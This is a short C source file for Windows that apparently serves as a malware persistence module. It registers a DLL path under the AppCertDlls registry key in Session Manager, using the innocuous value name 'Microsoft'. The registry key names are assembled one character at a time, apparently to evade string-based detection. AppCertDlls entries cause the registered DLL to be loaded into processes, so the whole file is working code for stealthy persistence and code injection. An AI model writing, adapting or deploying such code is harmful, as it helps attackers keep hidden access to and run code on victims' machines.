#include <Windows.h>

wchar_t* GetTargetPathW(wchar_t* const destination);

static size_t my_wcslen(const wchar_t* s)
{
	const wchar_t* a;
	for (a = s; *s; s++);
	return s - a;
}

static wchar_t* my_wcscat(
	wchar_t* const destination,
	wchar_t const* source
)
{
	wchar_t* destination_it = destination;

	// Find the end of the destination string:
	while (*destination_it)
		++destination_it;

	// Append the source string to the destination string:
	while ((*destination_it++ = *source++) != L'\0') {}

	return destination;
}

void AppCertDlls(void)
{
	HKEY regkey_sessionmanager;
	HKEY regkey_appcertdlls;
	DWORD dwSize;
	wchar_t pszValue[MAX_PATH];
	wchar_t pszString[] = {L'M',L'i',L'c',L'r',L'o',L's',L'o',L'f',L't',0};
	wchar_t sk[] = {L'S',L'Y',L'S',L'T',L'E',L'M',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'S',L'e',L't',L'\\',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'\\',L'S',L'e',L's',L's',L'i',L'o',L'n',L' ',L'M',L'a',L'n',L'a',L'g',L'e',L'r',0};
	wchar_t sk2[] = {L'A',L'p',L'p',L'C',L'e',L'r',L't',L'D',L'l',L'l',L's',0};
	GetTargetPathW(pszValue);
	dwSize = (my_wcslen(pszValue) + 1) * sizeof(WCHAR);
	RegOpenKeyW(HKEY_LOCAL_MACHINE, sk, &regkey_sessionmanager);
	RegCreateKeyW(regkey_sessionmanager, sk2, &regkey_appcertdlls);
	RegSetValueExW(regkey_appcertdlls, pszString, 0, REG_SZ, (LPCBYTE)pszValue, dwSize);
	RegCloseKey(regkey_appcertdlls);
}
